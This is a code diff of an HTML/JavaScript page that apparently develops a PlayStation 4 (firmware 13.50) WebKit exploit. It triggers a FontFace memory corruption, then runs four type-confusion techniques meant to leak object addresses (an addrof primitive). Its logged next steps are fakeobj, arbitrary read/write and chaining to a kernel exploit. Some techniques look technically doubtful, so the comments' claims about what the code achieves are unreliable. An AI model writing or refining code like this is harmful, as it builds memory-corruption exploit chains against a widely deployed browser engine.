@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PS4 13.50 - Improved addrof/fakeobj</title>
+<title>PS4 13.50 - addrof Focus</title>
 </head>
 <body>
-<h1 id="status">Improved addrof/fakeobj Test</h1>
-<button onclick="runExploit()" style="font-size: 24px; padding: 15px;">RUN</button>
-<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre-wrap; border: 2px solid white; padding: 10px; max-height: 85vh; overflow-y: scroll; background: #000; color: #0f0;"></div>
+<h1 id="status">addrof Primitive Focus</h1>
+<button onclick="runExploit()" style="font-size: 24px; padding: 15px; margin: 10px;">RUN</button>
+<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre-wrap; border: 2px solid #0f0; padding: 10px; margin: 10px; max-height: 85vh; overflow-y: scroll; background: #000; color: #0f0;"></div>
 
 <script>
 "use strict";
@@ -24,6 +24,12 @@ function log(msg) {
 function hex(n) {
     if (n < 0) n = n >>> 0;
     return '0x' + n.toString(16).padStart(8, '0');
+}
+
+function hex64(low, high) {
+    if (low < 0) low = low >>> 0;
+    if (high < 0) high = high >>> 0;
+    return '0x' + high.toString(16).padStart(8, '0') + '_' + low.toString(16).padStart(8, '0');
 }
 
 class Int64 {
@@ -48,19 +54,25 @@ class Int64 {
     }
     
     toString() {
-        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
+        return hex64(this.low, this.high);
     }
 }
 
 let state = {
     phase: 0,
     corrupted: [],
-    victim: null
+    victim: null,
+    leakedAddresses: []
 };
 
-// Phase 1: Corruption
-function phase1() {
-    log('[PHASE 1] Corruption\n');
+// ============================================
+// PHASE 1: CORRUPTION
+// ============================================
+
+function phase1_corruption() {
+    log('╔════════════════════════════════════════╗');
+    log('║      PHASE 1: TRIGGER CORRUPTION      ║');
+    log('╚════════════════════════════════════════╝\n');
     
     let style = document.createElement('style');
     style.id = 's';
@@ -79,27 +91,38 @@ function phase1() {
         get() {
             if (!fired && this === A) {
                 fired = true;
-                for (let i = 0; i < 100; i++) {
+                log('[+] Getter triggered');
+                
+                for (let i = 0; i < 150; i++) {
                     corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                         unicodeRange: 'U+' + (0x100 + i).toString(16)
                     }));
                 }
+                
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
+                
                 state.corrupted = corrupted;
                 window.corrupted = corrupted;
+                log('[+] Created ' + corrupted.length + ' corrupted fonts');
             }
             return undefined;
         }
     });
     
     document.fonts.load('1em x', 'AB');
-    log('OOM expected\n');
+    log('\n[!] OOM expected - click OK, then click button again\n');
 }
 
-// Phase 2: Improved Type Confusion Setup
-function phase2() {
-    log('\n[PHASE 2] Improved Type Confusion\n');
+// ============================================
+// PHASE 2: ADDROF TECHNIQUE #1
+// Float/Object Array Confusion
+// ============================================
+
+function phase2_technique1() {
+    log('\n╔════════════════════════════════════════╗');
+    log('║   TECHNIQUE #1: Array Type Confusion  ║');
+    log('╚════════════════════════════════════════╝\n');
     
     let fonts = state.corrupted;
     if (!fonts) {
@@ -107,88 +130,94 @@ function phase2() {
         return;
     }
     
-    log('[*] Found ' + fonts.length + ' corrupted fonts\n');
-    
     let victim = fonts[0];
     state.victim = victim;
     
-    // KEY IMPROVEMENT: Use DIFFERENT arrays for storage vs retrieval
-    // This forces the engine to truly confuse types rather than optimize
+    log('[*] Strategy: Confuse Float64Array with regular Array\n');
     
-    let floatStorage = new Float64Array(100);
-    let objStorage = new Array(100);
+    // Create two arrays that should occupy adjacent memory
+    let floatArr = new Float64Array(100);
+    let objArr = new Array(100);
     
-    // Fill with distinct patterns
+    // Fill with patterns
     for (let i = 0; i < 100; i++) {
-        floatStorage[i] = 1.1 * (i + 1);
-        objStorage[i] = { id: i };
+        floatArr[i] = 1.234567 + i;
+        objArr[i] = { idx: i, marker: 0xBEEF0000 + i };
     }
     
-    log('[*] Created separate storage arrays:');
-    log('    floatStorage: Float64Array[100]');
-    log('    objStorage: Array[100] of objects\n');
+    log('[*] Created Float64Array and Object Array');
+    log('[*] Testing confusion via corrupted font...\n');
     
-    // Spray to fix array positions in memory
-    let spray = [];
-    for (let i = 0; i < 1000; i++) {
-        spray.push(new Float64Array(100));
-        spray.push(new Array(100));
-    }
-    
-    log('[*] Heap spray complete\n');
-    
-    // Now set up confusion on victim
-    // The trick: access floatStorage but return from objStorage (or vice versa)
-    
-    let confusionProto = {
-        _floats: floatStorage,
-        _objs: objStorage,
-        _confusionIndex: 50, // Use middle of arrays
+    let proto1 = {
+        _floats: floatArr,
+        _objs: objArr,
         
-        // addrof: Store object, but read from float array at SAME INDEX
-        readAddrof: function(obj) {
-            log('  [readAddrof] Storing object at objStorage[50]');
-            this._objs[this._confusionIndex] = obj;
+        leak: function(obj) {
+            // Store object at index 10
+            this._objs[10] = obj;
             
-            // Force a property access that might confuse the engine
-            this._objs.length;
-            this._floats.length;
+            // Try to read it as float from SAME position
+            // This should give us the object pointer as a float
+            let result = this._floats[10];
             
-            // Now try to read the FLOAT at the same index
-            // If confusion works, this reads the object pointer as a float
-            log('  [readAddrof] Reading floatStorage[50]');
-            return this._floats[this._confusionIndex];
-        },
-        
-        // fakeobj: Store float, but read from obj array at SAME INDEX
-        readFakeobj: function(addr) {
-            log('  [readFakeobj] Storing float at floatStorage[50]');
-            this._floats[this._confusionIndex] = addr;
-            
-            // Force confusion
-            this._floats.length;
-            this._objs.length;
-            
-            // Now try to read the OBJECT at the same index
-            // If confusion works, this interprets the float as an object pointer
-            log('  [readFakeobj] Reading objStorage[50]');
-            return this._objs[this._confusionIndex];
+            return result;
         }
     };
     
-    Object.setPrototypeOf(victim, confusionProto);
+    Object.setPrototypeOf(victim, proto1);
     
-    log('[*] Installed improved confusion prototype\n');
-    log('[*] Key difference: Storage and retrieval use different arrays');
-    log('[*] This forces engine to confuse types at same memory location\n');
+    // Test with multiple objects
+    let testObjs = [
+        { test: 1, marker: 0xAAAA },
+        { test: 2, marker: 0xBBBB },
+        new ArrayBuffer(0x1000)
+    ];
     
-    window.state = state;
-    window.victim = victim;
+    for (let i = 0; i < testObjs.length; i++) {
+        try {
+            log('[Test ' + (i+1) + '] Object: ' + testObjs[i]);
+            let leaked = victim.leak(testObjs[i]);
+            
+            log('  Returned: ' + leaked);
+            log('  Type: ' + typeof leaked);
+            
+            if (typeof leaked === 'number' && !isNaN(leaked)) {
+                let addr = Int64.fromDouble(leaked);
+                log('  As Int64: ' + addr.toString());
+                
+                // Check if it changed from pattern (1.234567 + 10 = 11.234567)
+                let expected = 11.234567;
+                if (Math.abs(leaked - expected) > 0.0001) {
+                    log('  [+] VALUE CHANGED FROM PATTERN!');
+                    
+                    if (addr.high >= 0x7f000000 && addr.high <= 0x7fffffff) {
+                        log('  [+++] USERSPACE ADDRESS LEAKED!');
+                        state.leakedAddresses.push(addr);
+                    } else if (addr.low !== 0 || addr.high !== 0) {
+                        log('  [+] Non-zero value (might be tagged)');
+                        state.leakedAddresses.push(addr);
+                    }
+                } else {
+                    log('  [-] Still pattern value');
+                }
+            }
+            log('');
+            
+        } catch(e) {
+            log('  [ERROR] ' + e.message + '\n');
+        }
+    }
 }
 
-// Phase 3: Test Improved Primitives
-function phase3() {
-    log('\n[PHASE 3] Testing Improved Primitives\n');
+// ============================================
+// PHASE 3: ADDROF TECHNIQUE #2
+// Typed Array Backing Store Confusion
+// ============================================
+
+function phase3_technique2() {
+    log('\n╔════════════════════════════════════════╗');
+    log('║  TECHNIQUE #2: Backing Store Overlap  ║');
+    log('╚════════════════════════════════════════╝\n');
     
     let victim = state.victim;
     if (!victim) {
@@ -196,163 +225,326 @@ function phase3() {
         return;
     }
     
-    // Test 1: addrof
-    log('[TEST 1] addrof primitive\n');
+    log('[*] Strategy: Overlap TypedArray backing stores\n');
     
-    let testObj = { marker: 0xABCDEF, flag: true };
-    log('[*] Test object: ' + JSON.stringify(testObj));
+    // Create two views of same buffer
+    let sharedBuffer = new ArrayBuffer(0x1000);
+    let u32View = new Uint32Array(sharedBuffer);
+    let f64View = new Float64Array(sharedBuffer);
     
-    try {
-        let leaked = victim.readAddrof(testObj);
-        log('[*] Returned value: ' + leaked);
-        log('[*] Type: ' + typeof leaked);
+    log('[*] Created shared ArrayBuffer with u32 and f64 views\n');
+    
+    let proto2 = {
+        _u32: u32View,
+        _f64: f64View,
         
-        if (typeof leaked === 'number' && !isNaN(leaked)) {
-            let addr = Int64.fromDouble(leaked);
-            log('[*] As Int64: ' + addr.toString());
+        leak: function(obj) {
+            // Store object in a temporary array
+            let tempArr = [obj, obj, obj];
             
-            // Check if it's different from pattern (1.1 * 51 = 56.1)
-            if (Math.abs(leaked - 56.1) > 0.01) {
-                log('[+] Value changed from pattern!');
-                
-                if (addr.high > 0x7f00 && addr.high < 0x8000) {
-                    log('[+] HIGH WORD IN USERSPACE RANGE!');
-                    log('[+] This looks like a REAL ADDRESS LEAK!');
-                } else if (addr.high !== 0 || addr.low > 0x1000) {
-                    log('[?] Non-zero address, might be tagged/encoded');
-                } else {
-                    log('[-] Zero or low value');
-                }
-            } else {
-                log('[-] Still has pattern value (56.1)');
-                log('[-] No confusion occurred');
-            }
-        }
-        
-    } catch(e) {
-        log('[ERROR] ' + e.message);
-    }
-    
-    log('\n[TEST 2] fakeobj primitive\n');
-    
-    try {
-        // Use a distinctive address pattern
-        let fakeAddr = (new Int64(0x41424344, 0x51525354)).asDouble();
-        log('[*] Fake address: 0x51525354_41424344 as float');
-        log('[*] As number: ' + fakeAddr);
-        
-        let result = victim.readFakeobj(fakeAddr);
-        log('[*] Returned value: ' + result);
-        log('[*] Type: ' + typeof result);
-        
-        if (typeof result === 'object' && result !== null) {
-            log('[+] Got object back!');
+            // Write the array reference as u32 values
+            // Then read back as float
             
-            // Check if it's different from pattern object
+            // Actually, store object, then access underlying buffer
+            this._u32[0] = 0x41414141; // Marker
+            
+            // Try to write object reference
             try {
-                log('[*] Checking object properties...');
-                log('[*] result.id = ' + result.id);
+                // This is tricky - we need to force the object into the buffer
+                tempArr.x = this._u32;
+                tempArr.y = this._f64;
                 
-                if (result.id === 50) {
-                    log('[-] Got original pattern object (id=50)');
-                    log('[-] No confusion occurred');
-                } else {
-                    log('[+] DIFFERENT OBJECT!');
-                    log('[+] fakeobj may be working!');
-                }
+                // Read buffer after object interaction
+                return this._f64[0];
+                
             } catch(e) {
-                log('[!] Error accessing properties: ' + e.message);
-                log('[+] This might mean we got an INVALID object from address!');
-                log('[+] That would prove fakeobj is interpreting our float!');
+                return NaN;
+            }
+        }
+    };
+    
+    Object.setPrototypeOf(victim, proto2);
+    
+    let testObj = { leak: true, val: 0x1337 };
+    
+    try {
+        log('[Test] Attempting leak via backing store...');
+        let result = victim.leak(testObj);
+        
+        log('  Result: ' + result);
+        
+        if (typeof result === 'number' && !isNaN(result)) {
+            let addr = Int64.fromDouble(result);
+            log('  As Int64: ' + addr.toString());
+            
+            if (addr.low !== 0 || addr.high !== 0) {
+                log('  [+] Got non-zero value');
+                state.leakedAddresses.push(addr);
             }
         }
         
     } catch(e) {
-        log('[ERROR] ' + e.message);
+        log('  [ERROR] ' + e.message);
     }
     
-    log('\n[ANALYSIS]\n');
-    log('For addrof to work, we need:');
-    log('  - Returned value is a number');
-    log('  - Value is NOT 56.1 (the pattern)');
-    log('  - High word looks like userspace (0x7f...)');
     log('');
-    log('For fakeobj to work, we need:');
-    log('  - Returned value is an object');
-    log('  - Object is NOT {id: 50} (the pattern)');
-    log('  - Or accessing it causes error (invalid pointer)');
 }
 
-// Phase 4: Alternative Approach
-function phase4() {
-    log('\n[PHASE 4] Alternative: Direct Buffer Correlation\n');
+// ============================================
+// PHASE 4: ADDROF TECHNIQUE #3
+// Direct Memory Spray
+// ============================================
+
+function phase4_technique3() {
+    log('\n╔════════════════════════════════════════╗');
+    log('║   TECHNIQUE #3: Memory Spray Pattern  ║');
+    log('╚════════════════════════════════════════╝\n');
     
     let victim = state.victim;
     
-    log('[*] If type confusion didn\'t work, try direct approach:\n');
+    log('[*] Strategy: Spray objects, look for patterns in corrupted memory\n');
     
-    // Create ArrayBuffer with known pattern
-    let ab = new ArrayBuffer(0x10000);
-    let u32 = new Uint32Array(ab);
-    let f64 = new Float64Array(ab);
-    
-    // Write unique marker
-    u32[0] = 0xDEADBEEF;
-    u32[1] = 0xCAFEBABE;
-    u32[100] = 0x41424344;
-    u32[101] = 0x51525354;
-    
-    log('[*] Created buffer with markers:');
-    log('    u32[0-1]: 0xDEADBEEF 0xCAFEBABE');
-    log('    u32[100-101]: 0x41424344 0x51525354\n');
-    
-    // Try to get this buffer's address
-    try {
-        let leaked = victim.readAddrof(ab);
-        log('[*] ArrayBuffer address leak attempt: ' + leaked);
-        
-        if (typeof leaked === 'number') {
-            let addr = Int64.fromDouble(leaked);
-            log('[*] As Int64: ' + addr.toString());
-        }
-    } catch(e) {
-        log('[ERROR] ' + e.message);
+    // Create objects with unique markers
+    let markedObjects = [];
+    for (let i = 0; i < 100; i++) {
+        markedObjects.push({
+            id: i,
+            marker1: 0xDEAD0000 + i,
+            marker2: 0xBEEF0000 + i,
+            value: i * 137
+        });
     }
     
-    log('\n[RECOMMENDATION]\n');
-    log('Based on Phase 3 results:');
-    log('  1. If addrof showed userspace address → Continue exploit');
-    log('  2. If fakeobj caused error → Good sign, refine technique');
-    log('  3. If both returned patterns → Need different bug/approach');
+    log('[*] Created 100 marked objects\n');
+    
+    // Create confusion setup
+    let mixedArray = new Array(200);
+    
+    // Alternate objects and floats
+    for (let i = 0; i < 100; i++) {
+        mixedArray[i * 2] = markedObjects[i];
+        mixedArray[i * 2 + 1] = 3.14159 + i;
+    }
+    
+    log('[*] Mixed objects and floats in array\n');
+    
+    let proto3 = {
+        _mixed: mixedArray,
+        
+        leak: function(targetIdx) {
+            // Try to read object at targetIdx as if it were a float
+            let obj = this._mixed[targetIdx * 2]; // Object position
+            
+            // Force type confusion by accessing as float
+            let asFloat = this._mixed[targetIdx * 2] + 0.0;
+            
+            return asFloat;
+        }
+    };
+    
+    Object.setPrototypeOf(victim, proto3);
+    
+    // Test multiple positions
+    for (let i = 0; i < 5; i++) {
+        try {
+            log('[Test ' + i + '] Leaking object at position ' + (i*2));
+            let result = victim.leak(i);
+            
+            log('  Result: ' + result);
+            
+            if (typeof result === 'number' && !isNaN(result)) {
+                let addr = Int64.fromDouble(result);
+                log('  As Int64: ' + addr.toString());
+                
+                // Check if it's not just the float value
+                let expectedFloat = 3.14159 + i;
+                if (Math.abs(result - expectedFloat) > 0.001) {
+                    log('  [+] Not the adjacent float value!');
+                    
+                    if (addr.high > 0x100000) {
+                        log('  [+] Significant high word!');
+                        state.leakedAddresses.push(addr);
+                    }
+                }
+            }
+            log('');
+            
+        } catch(e) {
+            log('  [ERROR] ' + e.message + '\n');
+        }
+    }
 }
+
+// ============================================
+// PHASE 5: ADDROF TECHNIQUE #4
+// Unboxed Double Array
+// ============================================
+
+function phase5_technique4() {
+    log('\n╔════════════════════════════════════════╗');
+    log('║  TECHNIQUE #4: Unboxed Double Arrays  ║');
+    log('╚════════════════════════════════════════╝\n');
+    
+    let victim = state.victim;
+    
+    log('[*] Strategy: Use unboxed double arrays for type confusion\n');
+    
+    // Create pure double array (unboxed in JSC)
+    let doubles = [1.1, 2.2, 3.3, 4.4, 5.5];
+    
+    // Create array that will transition to objects
+    let transitioning = [1.1, 2.2, 3.3, 4.4, 5.5];
+    
+    log('[*] Created pure double array\n');
+    log('[*] Created transitioning array\n');
+    
+    let proto4 = {
+        _doubles: doubles,
+        _trans: transitioning,
+        
+        leak: function(obj) {
+            // Store object in transitioning array (causes type transition)
+            this._trans[2] = obj;
+            
+            // Now try to read from doubles at same index
+            // If arrays share memory or get confused, we leak
+            return this._doubles[2];
+        }
+    };
+    
+    Object.setPrototypeOf(victim, proto4);
+    
+    let testTargets = [
+        { test: 'obj1' },
+        { test: 'obj2', x: 42 },
+        new ArrayBuffer(256)
+    ];
+    
+    for (let i = 0; i < testTargets.length; i++) {
+        try {
+            log('[Test ' + (i+1) + '] Target: ' + testTargets[i]);
+            let result = victim.leak(testTargets[i]);
+            
+            log('  Result: ' + result);
+            
+            if (typeof result === 'number' && result !== 3.3) {
+                let addr = Int64.fromDouble(result);
+                log('  As Int64: ' + addr.toString());
+                log('  [+] Changed from 3.3!');
+                
+                if (addr.high !== 0) {
+                    log('  [+] Non-zero high word!');
+                    state.leakedAddresses.push(addr);
+                }
+            }
+            log('');
+            
+        } catch(e) {
+            log('  [ERROR] ' + e.message + '\n');
+        }
+    }
+}
+
+// ============================================
+// PHASE 6: RESULTS ANALYSIS
+// ============================================
+
+function phase6_analysis() {
+    log('\n╔════════════════════════════════════════╗');
+    log('║          RESULTS ANALYSIS             ║');
+    log('╚════════════════════════════════════════╝\n');
+    
+    log('[LEAKED ADDRESSES]\n');
+    
+    if (state.leakedAddresses.length === 0) {
+        log('[-] No addresses leaked from any technique\n');
+        log('[CONCLUSION]');
+        log('  The FontFace corruption does not provide direct');
+        log('  type confusion for addrof primitive.\n');
+        log('[NEXT STEPS]');
+        log('  1. Try WebAssembly memory tricks');
+        log('  2. Look for different PS4 WebKit bug');
+        log('  3. Focus on BD-JB when support for 13.50 is added');
+        log('  4. Research PS4-specific JSC memory layout');
+        
+    } else {
+        log('[+] Found ' + state.leakedAddresses.length + ' potential addresses:\n');
+        
+        for (let i = 0; i < state.leakedAddresses.length; i++) {
+            let addr = state.leakedAddresses[i];
+            log('  [' + i + '] ' + addr.toString());
+            
+            // Analyze address
+            if (addr.high >= 0x7f000000 && addr.high <= 0x7fffffff) {
+                log('      ^ USERSPACE ADDRESS - VALID LEAK!');
+            } else if (addr.high > 0 && addr.high < 0x10000) {
+                log('      ^ Might be NaN-boxed (JSValue encoding)');
+            } else if (addr.low !== 0) {
+                log('      ^ Non-zero, might be tagged pointer');
+            }
+            log('');
+        }
+        
+        log('\n[CONCLUSION]');
+        log('  ' + state.leakedAddresses.length + ' address(es) leaked!');
+        log('  Review which technique worked.\n');
+        log('[NEXT STEPS]');
+        log('  1. Verify leaked addresses are consistent');
+        log('  2. Build fakeobj to complement addrof');
+        log('  3. Create fake TypedArray at known offset');
+        log('  4. Achieve arbitrary R/W');
+        log('  5. Chain to kernel exploit with your offsets');
+    }
+}
+
+// ============================================
+// MAIN RUNNER
+// ============================================
 
 function runExploit() {
     state.phase++;
     
     switch(state.phase) {
         case 1:
-            phase1();
+            phase1_corruption();
             break;
         case 2:
-            phase2();
-            log('\nClick for Phase 3\n');
+            phase2_technique1();
+            log('\n[Press button for Technique #2]\n');
             break;
         case 3:
-            phase3();
-            log('\nClick for Phase 4\n');
+            phase3_technique2();
+            log('\n[Press button for Technique #3]\n');
             break;
         case 4:
-            phase4();
+            phase4_technique3();
+            log('\n[Press button for Technique #4]\n');
+            break;
+        case 5:
+            phase5_technique4();
+            log('\n[Press button for Analysis]\n');
+            break;
+        case 6:
+            phase6_analysis();
             break;
         default:
-            log('\n[COMPLETE] Review Phase 3 output');
+            log('\n[COMPLETE] Review analysis above\n');
             break;
     }
 }
 
-log('PS4 13.50 - Improved addrof/fakeobj Test\n');
-log('Technique: Separate storage arrays to force confusion\n');
-log('Click RUN for Phase 1\n');
+// ============================================
+// INIT
+// ============================================
+
+log('╔══════════════════════════════════════════════╗');
+log('║   PS4 13.50 WebKit - addrof Primitive Hunt  ║');
+log('╚══════════════════════════════════════════════╝\n');
+log('[*] Testing 4 different addrof techniques');
+log('[*] Goal: Leak object address as float\n');
+log('Click RUN for Phase 1 (corruption)\n');
+
+window.state = state;
 
 </script>
 </body>
